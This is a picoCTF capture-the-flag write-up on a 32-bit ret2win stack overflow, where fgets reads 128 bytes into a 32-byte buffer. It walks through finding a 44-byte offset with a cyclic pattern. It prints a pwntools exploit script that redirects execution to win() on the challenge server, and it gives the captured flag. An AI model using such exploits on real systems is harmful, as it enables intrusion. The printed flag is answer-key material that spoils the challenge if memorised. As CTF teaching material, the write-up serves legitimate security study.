---
tags:
  - picoctf
  - pwn
  - buffer_overflow
  - ret2win
  - x86_32bit
  - pwntools
---

## 🔍 Reconnaissance
The challenge provides a binary and its C source code. Initial inspection reveals a classic **ret2win** architecture, but with a twist: the developer attempted to use the "safe" `fgets()` function instead of the notoriously vulnerable `gets()`.

**Target Architecture:** 32-bit x86 ELF. 
*(Discovered by checking the address space of local functions using `objdump`, which yielded `0x0804...` format addresses).*

### Source Code Analysis
```c
void win() {
    FILE *fp = fopen("flag.txt", "r");
    // ... opens and prints flag ...
}

void vuln() {
    char buf[32];
    printf("Enter the secret key: ");
    fflush(stdout);
    fgets(buf, 128, stdin); // THE VULNERABILITY
    printf("You entered:, %s\n", buf);

```


## 💥 The Vulnerability

The developer explicitly allocated **32 bytes** for the `buf` container on the stack, but subsequently instructed `fgets()` to read up to **128 bytes** from standard input. This creates a massive 96-byte overflow window, allowing us to crush the saved Base Pointer (EBP) and overwrite the Instruction Pointer (EIP) to hijack control flow.

## 🛠️ Weaponization (Mapping the Stack)

While the source code suggests a 32-byte buffer, compilers often inject invisible padding to align memory. To find the _exact_ distance to the EIP, we used a **De Bruijn sequence** (cyclic pattern).

1. **Generate Pattern:** Generated a 100-byte cyclic pattern using `pwn cyclic 100`.
    
2. **Crash the Binary:** Fed the pattern to the binary inside `gdb`.
    
3. **Analyze the Crash:** The program crashed with a Segmentation Fault at `0x6161616c` in the EIP register. Because of Little-Endian formatting, this translates to the pattern substring `laaa`.
    
4. **Calculate Offset:** Running `pwn cyclic -l 0x6161616c` revealed the exact offset to the EIP: **44 bytes**.
    

**Stack Breakdown:**

- `32 bytes` (Buffer)
    
- `8 bytes` (Invisible Compiler Padding)
    
- `4 bytes` (Saved EBP)
    
- **Total Offset: 44 bytes**
    

## 🐍 The Exploit (`exploit.py`)

Using `objdump -d vuln | grep "<win>:"`, the target address for the `win()` function was identified as `0x08049276`.

```python
from pwn import *

1. Connect to the target instance
target = remote('dolphin-cove.picoctf.net', 50840)

2. Define the target coordinates (32-bit Little-Endian)
win_address = p32(0x08049276)

3. Build the Payload: 44 bytes of junk + the win() address
payload = b"A" * 44 + win_address

4. Execute the strike
target.recvuntil(b"Enter the secret key: ")
target.sendline(payload)

5. Retrieve the flag
target.interactive() 
```

## 🚩 The Loot

**Flag:** `picoCTF{fgets_0v3rfl0w42_76c69135}`